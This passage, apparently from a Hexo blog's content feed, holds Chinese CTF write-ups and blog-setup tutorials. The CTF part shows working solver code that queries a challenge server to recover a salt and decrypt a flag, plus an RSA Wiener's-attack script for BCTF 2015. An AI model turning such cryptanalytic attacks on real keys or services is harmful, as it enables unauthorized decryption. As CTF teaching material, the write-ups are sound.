o</code>这四个字母的结果不一样，猜测<code>SALT</code>只有这四个字母，但是长度未知。单个字母的找到了，现在来遍历2、3、4组合的，这样<code>LZW Dict</code>就有了，可以枚举<code>SALT</code>了，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_crypto</span><span class="params">(test_msg)</span>:</span></span><br><span class="line">    st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    st.connect((HOST, <span class="number">8888</span>))</span><br><span class="line">    s = st.recv(<span class="number">4096</span>)</span><br><span class="line">    proof = s[<span class="number">-17</span>:<span class="number">-1</span>]</span><br><span class="line">    msg = find_test(proof)</span><br><span class="line">    st.send(msg)</span><br><span class="line">    s = st.recv(<span class="number">4096</span>)</span><br><span class="line">    st.send(test_msg + <span class="string">"\n"</span>)</span><br><span class="line">    s = st.recv(<span class="number">4096</span>)</span><br><span class="line">    index = s.find(<span class="string">':'</span>) + <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> s[index:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line">    cs = ['n', 'i', 'k', 'o']</span><br><span class="line">    items = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> itertools.chain.from_iterable((<span class="string">''</span>.join(l) <span class="keyword">for</span> l <span class="keyword">in</span> itertools.product(cs, repeat=i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,  <span class="number">5</span>)):</span><br><span class="line">        c_c = get_crypto(item)</span><br><span class="line">        <span class="keyword">if</span> len(b64.b64decode(c_c)) - crypto_salt_len == <span class="number">1</span>:</span><br><span class="line">            items.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">4</span>, crypto_salt_len):</span><br><span class="line">        <span class="keyword">for</span> test <span class="keyword">in</span> itertools.permutations(items, i):</span><br><span class="line">            test_salt = <span class="string">''</span>.join(test)</span><br><span class="line">            <span class="keyword">if</span> len(LZW(test_salt, dict())) == crypto_salt_len:</span><br><span class="line">                <span class="keyword">if</span> encrypt(test_salt, <span class="string">''</span>) == crypto_salt:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'find salt:'</span>, test_salt</span><br><span class="line">                    <span class="keyword">return</span></span><br></pre></td></tr></table></figure></p><p>目前为止<code>SALT: nikonikoninikonikoni</code>被猜出来了，后面就要还原提供的密文了。有了<code>SALT</code>就可以计算出<code>OTPBase</code>，然后还原出<code>toEnc</code>，计算出<code>SALT</code>的<code>toEnc</code>，这两个作差，剩下的就是密文的<code>toEnc</code>，最后在<code>LZW Dict</code>里找到对应值就可以了，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span><span class="params">(crypto, salt)</span>:</span></span><br><span class="line">    enc = b64.b64decode(crypto)</span><br><span class="line">    key = hashlib.md5(salt*<span class="number">2</span>).digest()</span><br><span class="line">    OTPBase = <span class="string">""</span></span><br><span class="line">    OPT = <span class="string">""</span></span><br><span class="line">    step = HASHLENGTH - SMALLPRIME</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>*N+step, step):</span><br><span class="line">        rand, key = STRONGPseudoRandomGenerator(key)</span><br><span class="line">        OTPBase += rand</span><br><span class="line">    otpadded = []</span><br><span class="line">    toEnc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(enc)):</span><br><span class="line">        index = i % N</span><br><span class="line">        iRound = i / N + <span class="number">1</span></span><br><span class="line">        OTP = OTPBase[<span class="number">3</span>*int(pow(ord(OTPBase[<span class="number">3</span>*index]),ord(OTPBase[<span class="number">3</span>*index+<span class="number">1</span>])*iRound, N))+<span class="number">2</span>]</span><br><span class="line">        otpadded.append(ord(OTP))</span><br><span class="line">        toEnc.append(ord(enc[i]) ^ ord(OTP))</span><br><span class="line">    <span class="keyword">print</span> toEnc</span><br><span class="line">    salt_dict = dict()</span><br><span class="line">    LZW(salt, salt_dict)</span><br><span class="line">    reverse_dict = dict((v, k) <span class="keyword">for</span> k, v <span class="keyword">in</span> salt_dict.items())</span><br><span class="line">    <span class="keyword">print</span> reverse_dict</span><br><span class="line">    m = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">11</span>, len(toEnc)):</span><br><span class="line">        m += reverse_dict[toEnc[i]]</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure></p><p>最后得到<code>flag: nikoninikoni</code>。</p><blockquote><p>如果，明文里的字母不全在<code>SALT</code>里的话，用密文是无法恢复出完整明文的（但是可以把缺的部分暴力破解出来^-^）。<br>完整代码<a href="http://junzhepanblog.qiniudn.com/weak_enc_crack.py" target="_blank" rel="noopener">点此下载</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BCTF 2015 checkin warmup Write-ups</title>
      <link href="/2015/03/23/BCTF-2015-checkin-warmup-Write-ups/"/>
      <url>/2015/03/23/BCTF-2015-checkin-warmup-Write-ups/</url>
      <content type="html"><![CDATA[<p>#checkin<br>Score: 10<br>Please checkin at IRC</p><a id="more"></a><p>进去后看到一堆人在里面输入<code>checkin</code>，我也跟着输了，等了一会发现不对，然后找了找，发现公告如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BCTF 2015 has started. Check in flag: OPGS&#123;jr1p0zr-g0-OPGS-2015_t00q-yhpx&#125;.</span><br></pre></td></tr></table></figure></p><p>ROT13加密，解密得到flag：<code>BCTF{we1c0me-t0-BCTF-2015_g00d-luck}</code>。</p><p>#warmup<br>Score: 50</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span><br></pre></td></tr></table></figure><p><a href="http://dl.bctf.cn/warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz" target="_blank" rel="noopener">http://dl.bctf.cn/warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz</a></p><p>提供的文件是RSA公钥，初步思路是读取公钥后，利用<a href="http://en.wikipedia.org/wiki/Wiener%27s_attack" target="_blank" rel="noopener">Wiener’s attack</a>求出私钥，然后解密。</p><blockquote><p><code>Wiener&#39;s attack</code>代码参考<a href="https://ctfcrew.org/writeup/87" target="_blank" rel="noopener">Wiener (Crypto 300)</a></p></blockquote><p>代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__author__ = <span class="string">'Jack'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> wiener_attack <span class="keyword">import</span> wienerAttack</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    (x, lastx) = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    (y, lasty) = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a // b</span><br><span class="line">        (a, b) = (b, a % b)</span><br><span class="line">        (x, lastx) = (lastx - q * x, x)</span><br><span class="line">        (y, lasty) = (lasty - q * y, y)</span><br><span class="line">    <span class="keyword">return</span> (lastx, lasty, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    (inv, q, gcd_val) = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> inv % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pub_key = RSA.importKey(open(<span class="string">'warmup.pub'</span>))</span><br><span class="line">    c_hex = <span class="string">'01e04304936215de8e21965cfca9c245b1a8f38339875d3677'</span> \</span><br><span class="line">            <span class="string">'9c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f2'</span> \</span><br><span class="line">            <span class="string">'7456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd'</span> \</span><br><span class="line">            <span class="string">'094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37'</span> \</span><br><span class="line">            <span class="string">'d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e'</span> \</span><br><span class="line">            <span class="string">'7a56d783660418ebdf6898d7037cea25867093216c2c702ef'</span> \</span><br><span class="line">            <span class="string">'3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cd'</span> \</span><br><span class="line">            <span class="string">'ffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf'</span> \</span><br><span class="line">            <span class="string">'6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a'</span> \</span><br><span class="line">            <span class="string">'70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48'</span> \</span><br><span class="line">            <span class="string">'f5aa43417631846824b5e86'</span></span><br><span class="line">    c = int(c_hex, <span class="number">16</span>)</span><br><span class="line">    p, q = wienerAttack(pub_key.n, pub_key.e)</span><br><span class="line">    d = modinv(pub_key.e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    m = pow(c, d, pub_key.n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag: %s"</span> % hex(m)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>得到flag: <code>BCTF{9etRea4y!}</code>。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo 优化</title>
      <link href="/2015/03/17/Hexo-%E4%BC%98%E5%8C%96/"/>
      <url>/2015/03/17/Hexo-%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<p>#RSS 插件<br>使用插件<code>hexo-generator-feed</code>能生成<code>Atom 1.0</code>或者<code>RSS 2.0 feed</code>。安装很简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure></p><p>然后在<code>Hexo</code>根目录下的<code>_config.yml</code>里配置一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">feed:</span><br><span class="line">    type: atom</span><br><span class="line">    path: atom.xml</span><br><span class="line">    limit: 20</span><br></pre></td></tr></table></figure></p><ul><li>type 表示类型, 是 atom 还是 rss2.</li><li>path 表示 Feed 路径</li><li>limit 最多多少篇最近文章<br>根据使用的主题不同配置也可能不同，我使用的是<code>jacman</code>，<code>RSS</code>配置就在主题目录下的<code>_config.yml</code>文件里。</li></ul><a id="more"></a><p>#网站地图 Sitemap<br>使用插件·hexo-generator-sitemap·能生成站点地图, 方法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure></p><p>然后在 Hexo 根目录下的<code>_config.yml</code>里配置一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sitemap:</span><br><span class="line">  path: sitemap.xml</span><br></pre></td></tr></table></figure></p><p><code>path</code>表示<code>Sitemap</code>的路径，默认为<code>sitemap.xml</code>。</p><p>#Swiftype 站内搜索<br>使用百度站内搜索, 但是这依赖于网站在百度的索引量, 如果百度收录情况不好的话, 这个搜索效果微乎其微。而在收录方面很快的 Google, 因为你懂的原因现在也不能使用。那么可以考虑这个替换方案, 使用<a href="https://swiftype.com/" target="_blank" rel="noopener">Swiftype</a>。</p><p>##Swiftype网站配置</p><ol><li>首先去<code>Swiftype</code>注册, 然后登录。</li><li>根据指引建立好自己网站对应的索引，不得不说swiftype很棒，只要输入一个网址它便会自动的抓取这个站点的所有页面，并自动添加关键字。</li><li>切换到install面板，进入安装面板后需要先配置一下自己的站点，按如下配置来操作：<ul><li>DIFFERENT PAGE</li><li>SEARCH RESULTS PAGE ADDRESS： <a href="http://junzhepan.github.io/search/index.html" target="_blank" rel="noopener">http://junzhepan.github.io/search/index.html</a></li><li>My website alreadly has a search field (#st-search-input)</li><li>My website alreadly has a search results container (#st-results-container)</li><li>其他默认</li></ul></li><li>然后点击配置界面左侧的<code>SWIFTYPE INSTALL CODE</code>来获取所需要的js代码，获取的代码如下：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">w,d,t,u,n,s,e</span>)</span>&#123;w[<span class="string">'SwiftypeObject'</span>]=n;w[n]=w[n]||<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  (w[n].q=w[n].q||[]).push(<span class="built_in">arguments</span>);&#125;;s=d.createElement(t);</span><br><span class="line">  e=d.getElementsByTagName(t)[<span class="number">0</span>];s.async=<span class="number">1</span>;s.src=u;e.parentNode.insertBefore(s,e);</span><br><span class="line">  &#125;)(<span class="built_in">window</span>,<span class="built_in">document</span>,<span class="string">'script'</span>,<span class="string">'//s.swiftypecdn.com/install/v1/st.js'</span>,<span class="string">'_st'</span>);</span><br><span class="line"></span><br><span class="line">  _st(<span class="string">'install'</span>,<span class="string">'a1otTFzsfxyzwWtgmnWU'</span>);</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>其中的网址注意把<code>junzhepan.github.io</code>部分替换成自己的网址。<br><code>SWIFTYPE INSTALL CODE</code>部分替换成自己的代码</p></blockquote><p>至此<code>Swiftype</code>网站部分的配置结束，下面要对本地的<code>Jacman</code>主题进行一些简单的配置就可以了。</p><p>##Jacman主题配置<br>首先打开<code>Jacman</code>主题下的<code>_config.yml</code>文件在末尾添加如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swiftype_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure></p><p>然后到<code>Hexo</code>的<code>source</code>目录下建立一个<code>search</code>文件夹，再在其下建立一个<code>index.md</code>，<code>index.md</code>中写入如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">layout: search</span><br><span class="line">title: search</span><br><span class="line">----</span><br></pre></td></tr></table></figure></p><p>然后再切换的到<code>pacman\layout\_partial</code>目录下，最后需要做的收尾工作全部都在这个目录下。<br>先打开<code>header.ejs</code>，在<code>&lt;% } else { %&gt;</code>前面添加如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;% &#125;else if (theme.swiftype_search&amp;&amp;theme.swiftype_search.enable)&#123; %&gt;</span><br><span class="line">                        &lt;form class=&quot;search&quot; action=&quot;&lt;%- config.root %&gt;search/index.html&quot; method=&quot;get&quot; accept-charset=&quot;utf-8&quot;&gt;</span><br><span class="line">                        &lt;label&gt;Search&lt;/label&gt;</span><br><span class="line">                        &lt;input type=&quot;text&quot; id=&quot;st-search-input&quot; maxlength=&quot;20&quot; placeholder=&quot;搜索&quot; /&gt;</span><br><span class="line">                        &lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p><code>header.ejs</code>的处理完成。接下来处理<code>search.ejs</code>。将原来的<code>search.ejs</code>中的代码清空，替换为如下的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if(theme.swiftype_search.enable) &#123; %&gt;</span><br><span class="line">&lt;div  id=&quot;container&quot; class=&quot;page&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;st-results-container&quot; style=&quot;width:80%&quot;&gt;正在加载搜索结果，请稍等。&lt;/div&gt;</span><br><span class="line">  &lt;style&gt;.st-result-text &#123;</span><br><span class="line">  background: #fafafa;</span><br><span class="line">  display: block;</span><br><span class="line">  border-left: 0.5em solid #ccc;</span><br><span class="line">  -webkit-transition: border-left 0.45s;</span><br><span class="line">  -moz-transition: border-left 0.45s;</span><br><span class="line">  -o-transition: border-left 0.45s;</span><br><span class="line">  -ms-transition: border-left 0.45s;</span><br><span class="line">  transition: border-left 0.45s;</span><br><span class="line">  padding: 0.5em;</span><br><span class="line">&#125;</span><br><span class="line">@media only screen and (min-width: 768px) &#123;</span><br><span class="line">  .st-result-text &#123;</span><br><span class="line">    padding: 1em;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.st-result-text:hover &#123;</span><br><span class="line">  border-left: 0.5em solid #ea6753;</span><br><span class="line">&#125;</span><br><span class="line">.st-result-text h3 a&#123;</span><br><span class="line">  color: #2ca6cb;</span><br><span class="line">  line-height: 1.5;</span><br><span class="line">  font-size: 22px;</span><br><span class="line">&#125;</span><br><span class="line">.st-snippet em &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  color: #ea6753;</span><br><span class="line">&#125;&lt;/style&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>其实主要就是为了控制结果的显示样式。</p></blockquote><p>最后打开<code>footer.ejs</code>，在最后一个标签之前添加一开始拷贝的那段<code>js</code>代码，我的是：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">w,d,t,u,n,s,e</span>)</span>&#123;w[<span class="string">'SwiftypeObject'</span>]=n;w[n]=w[n]||<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  (w[n].q=w[n].q||[]).push(<span class="built_in">arguments</span>);&#125;;s=d.createElement(t);</span><br><span class="line">  e=d.getElementsByTagName(t)[<span class="number">0</span>];s.async=<span class="number">1</span>;s.src=u;e.parentNode.insertBefore(s,e);</span><br><span class="line">  &#125;)(<span class="built_in">window</span>,<span class="built_in">document</span>,<span class="string">'script'</span>,<span class="string">'//s.swiftypecdn.com/install/v1/st.js'</span>,<span class="string">'_st'</span>);</span><br><span class="line"></span><br><span class="line">  _st(<span class="string">'install'</span>,<span class="string">'a1otTFzsfxyzwWtgmnWU'</span>);</span><br></pre></td></tr></table></figure></p><p>至此所有的操作均已经完成。</p><p>#使用图床<br>国内最好用的免费图床应该是<a href="http://www.qiniu.com/" target="_blank" rel="noopener">七牛</a>了, 我的Blog的图片都是上传的七牛生链接然后拿过来用的。</p><p>#优化<br>为了优化<code>HTML,CSS,JS</code>, 我们需要安装插件<code>Hexo Optimize</code>, 安装非常简单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-console-optimize</span><br></pre></td></tr></table></figure></p><p>利用命令<code>hexo optimize</code>或者<code>hexo o</code>即可优化资源：HTML、CSS、JS、Image.</p><p>#About页面<br>首先在主目录找到<code>_config.yml</code>，找到<code>url</code>添加<code>about_dir: about</code>到这个板块。然后在<code>/source</code>里面建立<code>about</code>文件夹。在<code>about</code>文件夹里建立<code>index.md</code>。编辑<code>index.md</code>就和发布其他的文章一样，格式都一样。</p>]]></content>
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo your blog</title>
      <link href="/2015/03/17/Hexo-your-blog/"/>
      <url>/2015/03/17/Hexo-your-blog/</url>
      <content type="html"><![CDATA[<p>#前言<br>之前使用了几个现有博客平台，然后又用团队的博客环境<code>WordPress</code>，感觉编辑文章太麻烦。接触到<code>Markdown</code>，瞬间就喜欢上了，编辑起来方便，显示效果简介。于是，就想用<code>Markdown</code>来写博客，网上搜索一番，发现<code>Hexo</code>用起来最方便。最终决定用<code>Hexo</code>+<code>GitHub Pages</code>来搭建。<code>GitHub Pages</code>本用于介绍托管在GitHub的项目， 不过，由于他的空间免费稳定，用来做搭建一个博客再好不过了。</p><a id="more"></a><p>#环境准备</p><p>##Node.js<br>到<a href="https://nodejs.org/" target="_blank" rel="noopener">Node.js</a>官网下载相应平台的最新版本，一路安装即可。</p><p>##Git<br><code>Git</code>的客户端很多，我目前用Windows操作系统，使用的是<a href="http://git-scm.com/download/win" target="_blank" rel="noopener">Git for Windows</a>，下载后根据提示安装即可。</p><p>##GitHub<br>注册一个<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>帐号，添加SSH公钥到『Account settings -&gt; SSH Keys -&gt; Add SSH Key』。<br>对于SSH Keys，看一下步骤：</p><ol><li><p>首先设置你的用户名密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;xxx@xxx.com&quot; #xxx为github注册邮箱</span><br><span class="line">git config --global user.name &quot;xxx&quot; #xxx是github注册用户名</span><br></pre></td></tr></table></figure></li><li><p>生成密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (//.ssh/id_rsa): H:\git\myssh\ssh</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in H:\git\myssh\ssh.</span><br><span class="line">Your public key has been saved in H:\git\myssh\ssh.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">b0:0c:2e:67:33:ab:c1:50:10:40:0a:ba:c1:80:59:22 xxx@xxx.com</span><br></pre></td></tr></table></figure></li></ol><p>上述命令若执行成功，会在H:\git\myssh目录下生成两个文件id_rsa和id_rsa.pub，然后用文本编辑器打开id_rsa.pub文件，拷贝其中的内容，将其添加到Add SSH Key，将id_rsa和id_rsa.pub拷贝至你Git安装目录下的.ssh目录。</p><ol start="3"><li>验证<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></li></ol><p>正常情况下会收到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &apos;github.com (207.97.227.239)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure></p><p>输入yes就好，然后会看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi xxx! You&apos;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure></p><blockquote><p>中间可能遇到以下问题：<br><a href="http://help.github.com/articles/generating-ssh-keys" target="_blank" rel="noopener">GitHub Help - Generating SSH Keys</a><br><a href="https://help.github.com/articles/error-permission-denied-publickey/" target="_blank" rel="noopener">GitHub Help - Error Permission denied (publickey)</a></p></blockquote><p>##GitHub Pages<br>与GitHub建立好链接之后，就可以方便的使用它提供的Pages服务，GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户&amp;组织页（站），另一种是依附项目的pages。<br>想建立个人博客是用的第一种，形如username.github.io这样的可访问的站，每个用户名下面只能建立一个。<br>登录后系统，在github首页，点击页面右下角『New Repository』，然后填写Repository信息。</p><blockquote><p>Github Pages的Repository名字是特定的，比如我Github账号是junzhepan，那么我Github Pages Repository名字就是junzhepan.github.io。</p></blockquote><p>##Hexo</p><p>###安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure></p><p>###建站<br>安装<code>Hexo</code>完成后，请执行下列命令，<code>Hexo</code>将会在指定文件夹中新建所需要的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ cd &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure></p><p>新建完成后，指定文件夹的目录如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 